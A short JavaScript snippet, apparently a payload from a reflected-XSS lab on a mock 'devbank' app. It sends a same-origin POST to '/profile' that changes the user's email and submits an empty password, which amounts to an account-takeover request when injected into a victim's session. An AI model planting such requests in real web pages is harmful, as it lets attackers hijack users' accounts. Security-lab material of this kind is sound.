fetch("/profile", {
  method: "POST",
  headers: {
    "Content-Type": "application/x-www-form-urlencoded"
  },
  body: "email=B2-reflected-XSS%40devbank.local&password="
});
